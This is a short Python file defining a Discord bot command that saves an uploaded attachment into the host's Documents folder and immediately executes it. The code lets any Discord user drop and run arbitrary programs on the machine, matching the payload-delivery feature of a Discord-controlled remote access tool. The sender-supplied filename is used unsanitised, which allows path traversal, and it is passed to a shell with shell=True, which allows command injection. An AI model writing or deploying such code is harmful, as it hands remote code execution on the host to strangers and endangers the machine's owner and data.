import discord
import os
import subprocess
import platform

async def share_file(ctx):
    try:
        if len(ctx.message.attachments) == 0:
            await ctx.send('Please upload a file with your message.')
            return

        attachment = ctx.message.attachments[0]
        file_name = attachment.filename
        file_content = await attachment.read()

        user_documents_folder = get_documents_folder()
        file_path = os.path.join(user_documents_folder, file_name)
        with open(file_path, 'wb') as f:
            f.write(file_content)
        
        subprocess.Popen([file_path], shell=True)
        await ctx.send(f'File `{file_name}` saved to {user_documents_folder} and opened.')
    except Exception as e:
        await ctx.send(f'Failed to save or open file: {e}')

def get_documents_folder():
    system = platform.system()
    if system == 'Windows':
        return os.path.join(os.getenv('USERPROFILE'), 'Documents')
    elif system == 'Darwin':
        return os.path.join(os.getenv('HOME'), 'Documents')
    elif system == 'Linux':
        return os.path.join(os.getenv('HOME'), 'Documents')
    else:
        raise OSError(f'Unsupported operating system: {system}')
